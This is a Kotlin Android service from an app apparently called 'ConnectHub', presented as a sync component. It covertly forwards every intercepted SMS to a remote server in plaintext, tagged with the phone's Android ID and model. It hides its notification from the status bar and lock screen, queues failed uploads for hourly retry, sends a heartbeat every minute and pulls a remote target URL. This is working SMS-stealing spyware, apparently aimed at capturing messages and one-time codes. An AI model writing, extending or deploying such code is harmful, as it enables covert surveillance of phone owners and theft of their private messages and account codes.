package com.rohan.connecthub

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat



import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.rohan.connecthub.api.RetrofitClient
import com.rohan.connecthub.data.db.AppDatabase
import com.rohan.connecthub.data.db.SmsMessage
import com.rohan.connecthub.models.SmsLogRequest
import com.rohan.connecthub.utils.CryptoUtils
import com.rohan.connecthub.utils.SharedPrefManager
import com.rohan.connecthub.workers.RetryUploadWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class SyncService : Service() {

    private val serviceJob = Job()
    private val scope = CoroutineScope(Dispatchers.IO + serviceJob)
    private lateinit var smsDao: AppDatabase
    private var wakeLock: PowerManager.WakeLock? = null


    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        smsDao = AppDatabase.getDatabase(this)
        createNotificationChannel()
        val notification = createNotification("ConnectHub: System Active", "Connecting to Secure Intercept Protocol...")
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, notification)
        }
        
        scheduleRetryWorker()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val androidId = try {
            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        } catch (e: Exception) {
            null
        }
        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"

        SharedPrefManager.saveDeviceId(this, androidId)
        val deviceId = SharedPrefManager.getDeviceId(this)



        // Warm up API client
        CoroutineScope(Dispatchers.IO).launch {
            try { RetrofitClient.getInstance(this@SyncService) } catch(e: Exception) {}
        }



        if (intent != null && intent.hasExtra("sms_body")) {
            val sender = intent.getStringExtra("sender") ?: "Unknown"
            val body = intent.getStringExtra("sms_body") ?: ""
            val timestamp = intent.getLongExtra("timestamp", System.currentTimeMillis())
            val subId = intent.getIntExtra("sub_id", -1)
            val msgId = intent.getStringExtra("msg_id")

            acquireWakeLock()
            syncSms(sender, body, timestamp, subId, deviceId, deviceModel, msgId)


        }

        fetchConfig()
        startHeartbeat()
        return START_STICKY
    }

    private fun syncSms(sender: String, body: String, timestamp: Long, subId: Int, deviceId: String, deviceModel: String, msgId: String? = null) {
        scope.launch {
            try {
                val api = RetrofitClient.getInstance(this@SyncService)
                // Encryption temporarily disabled: Backend cannot decrypt AndroidKeyStore keys without complex key exchange.
                // Relying on HTTPS for transport security.
                // val (iv, encryptedBody) = CryptoUtils.encrypt(body)
                // val ivStr = Base64.encodeToString(iv, Base64.NO_WRAP)
                // val bodyStr = Base64.encodeToString(encryptedBody, Base64.NO_WRAP)

                val bodyStr = body
                val ivStr = ""

                val request = SmsLogRequest(
                    device_id = deviceId,
                    sender = sender,
                    messageBody = bodyStr,
                    iv = ivStr,
                    timestamp = timestamp,
                    sim_info = "SIM_SLOT_$subId",
                    device_model = deviceModel,
                    android_version = Build.VERSION.RELEASE,
                    msg_id = msgId
                )

                val response = api.syncSms(request)
                if (!response.isSuccessful) {
                    saveSmsToDb(sender, body.toByteArray(), ByteArray(0), timestamp, subId, deviceModel)
                }
            } catch (e: Exception) {
                // If network fails, save plain text to DB for later retry
                try {
                    saveSmsToDb(sender, body.toByteArray(), ByteArray(0), timestamp, subId, deviceModel)
                } catch (e2: Exception) {
                    Log.e("SyncService", "Failed to save SMS to DB", e2)
                }
            } finally {
                releaseWakeLock()
            }
        }
    }

    private fun acquireWakeLock() {
        if (wakeLock == null) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ConnectHub::SmsSyncLock")
        }
        if (wakeLock?.isHeld == false) {
            wakeLock?.acquire(5000) // Max 5 seconds safety timeout
        }
    }

    private fun releaseWakeLock() {
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
    }


    private suspend fun saveSmsToDb(sender: String, encryptedBody: ByteArray, iv: ByteArray, timestamp: Long, subId: Int, deviceModel: String) {
        val sms = SmsMessage(
            sender = sender,
            messageBody = encryptedBody,
            iv = iv,
            timestamp = timestamp,
            simInfo = "SIM_SLOT_$subId",
            deviceModel = deviceModel,
            androidVersion = Build.VERSION.RELEASE
        )
        smsDao.smsMessageDao().insertSms(sms)
    }

    private fun fetchConfig() {
        scope.launch {
            try {
                val api = RetrofitClient.getInstance(this@SyncService)
                val response = api.getConfig()
                if (response.isSuccessful) {
                    val targetUrl = response.body()?.target_url
                    Log.d("SyncService", "Remote URL: $targetUrl")

                    val updatedNotif = createNotification("ConnectHub: System Active", "Terminal ID: ${SharedPrefManager.getDeviceId(this@SyncService)}")
                    val manager = getSystemService(NotificationManager::class.java)
                    manager.notify(1, updatedNotif)
                }
            } catch (e: Exception) {
                Log.e("SyncService", "Config fetch error", e)
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "SYNC_CHANNEL",
                "Sync",
                NotificationManager.IMPORTANCE_MIN  // Hides from status bar and shade
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(title: String, content: String): Notification {
        return NotificationCompat.Builder(this, "SYNC_CHANNEL")
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(R.drawable.ic_stat_hub)
            .setPriority(NotificationCompat.PRIORITY_MIN)  // No status bar icon
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden from lock screen
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun startHeartbeat() {
        scope.launch {
            while (true) {
                try {
                    val deviceId = SharedPrefManager.getDeviceId(this@SyncService)
                    if (!deviceId.isNullOrEmpty()) {
                        val api = RetrofitClient.getInstance(this@SyncService)
                        api.sendHeartbeat(deviceId)
                        Log.d("SyncService", "Heartbeat Sent")
                    }
                } catch (e: Exception) {
                    Log.e("SyncService", "Heartbeat Failed", e)
                }
                kotlinx.coroutines.delay(60_000) // 1 minute delay
            }
        }
    }

    private fun scheduleRetryWorker() {
        val workRequest = PeriodicWorkRequestBuilder<RetryUploadWorker>(1, TimeUnit.HOURS).build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "RetryUpload",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }
}